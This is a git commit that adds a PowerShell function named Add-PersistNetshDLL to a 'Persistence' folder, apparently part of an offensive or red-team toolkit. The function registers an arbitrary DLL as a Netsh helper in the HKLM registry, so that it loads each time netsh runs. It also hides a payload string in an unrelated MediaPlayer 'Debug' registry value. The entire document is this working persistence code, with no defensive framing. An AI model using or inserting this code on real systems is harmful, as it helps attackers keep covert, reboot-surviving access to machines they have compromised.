40c3f618d51c06da8eb84c8585f2f2b5fbc27448
Tanay Shah <tanay.v.shah@gmail.com>
2022-09-07 23:40:18 -0700

    Netsh helper dll

---
+++ Persistence/Add-PersistNetshDll.ps1
@@ -0,0 +1,20 @@
+function Add-PersistNetshDLL {
+
+    [CmdletBinding()]
+            Param(
+            [Parameter(Mandatory)]
+            [string[]]$Path, # Check if you can use a network path for this
+
+            [Parameter(Mandatory=$false)]
+            [string]$Name = "NetshHelper",
+
+            [Parameter(Mandatory)]
+            [string]$Payload
+            )
+
+    # Create helper dll entry
+    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\NetSh" -Name "$Name" -Value "$Path" -PropertyType String | Out-Null
+    
+    # Set payload value
+    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\MediaPlayer" -Name Debug -Value "$Payload" -PropertyType String | Out-Null
+}
